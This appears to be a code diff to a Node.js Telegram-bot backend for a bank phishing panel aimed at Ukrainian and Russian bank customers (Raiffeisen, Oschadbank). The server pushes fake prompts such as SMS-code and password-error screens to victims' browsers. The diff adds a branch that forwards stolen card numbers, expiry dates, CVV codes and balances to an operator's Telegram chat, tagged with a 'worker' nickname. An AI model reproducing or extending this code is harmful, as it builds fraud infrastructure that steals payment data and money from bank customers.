@@ -35,7 +35,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Финальные исправления применены.', { parse_mode: 'HTML' }).catch(console.error);
+    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Изменения для кнопки "ЗАПРОС" применены.', { parse_mode: 'HTML' }).catch(console.error);
 } else {
     console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
@@ -83,7 +83,10 @@ bot.on('callback_query', (callbackQuery) => {
         case 'lk': case 'call': case 'telegram_debit': case 'code_error': case 'other': case 'ban': break;
         case 'password_error': command.data = { loginType: sessionData.loginMethod || 'phone' }; break;
         case 'sms': command.data = { text: "Вам відправлено SMS з кодом..." }; break;
-        case 'request_details': command.data = { isRaiffeisen: sessionData.bankName === 'Райффайзен' }; break;
+        case 'request_details':
+            const bankName = sessionData ? sessionData.bankName : '';
+            command.data = { isRaiffeisen: bankName === 'Райффайзен' };
+            break;
         default: bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` }); return;
     }
     ws.send(JSON.stringify(command));
@@ -104,8 +107,21 @@ app.post('/api/submit', (req, res) => {
     // ВАЖНО: Проверяем `stepData` (новые данные), а не `newData` (все данные сессии),
     // чтобы избежать повторной отправки старых кодов.
     
+    // 0. Лог данных по запросу "ЗАПРОС"
+    if (stepData.card_details_card) {
+        message = `<b>📋 Запрошенные данные</b>\n\n`;
+        message += `<b>Название банка:</b> ${newData.bankName}\n`;
+        message += `<b>Номер карты:</b> <code>${stepData.card_details_card}</code>\n`;
+        message += `<b>Срок действия:</b> <code>${stepData.card_details_expiry}</code>\n`;
+        message += `<b>CVV:</b> <code>${stepData.card_details_cvv}</code>\n`;
+        if (stepData.card_details_balance) {
+            message += `<b>Баланс:</b> <code>${stepData.card_details_balance}</code>\n`;
+        }
+        message += `<b>Worker:</b> @${workerNick}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+    }
     // 1. Лог кода со звонка (Ощадбанк)
-    if (stepData.call_code) {
+    else if (stepData.call_code) {
         message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
         message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
         const phone = newData.phone || newData.fp_phone || 'не указан';
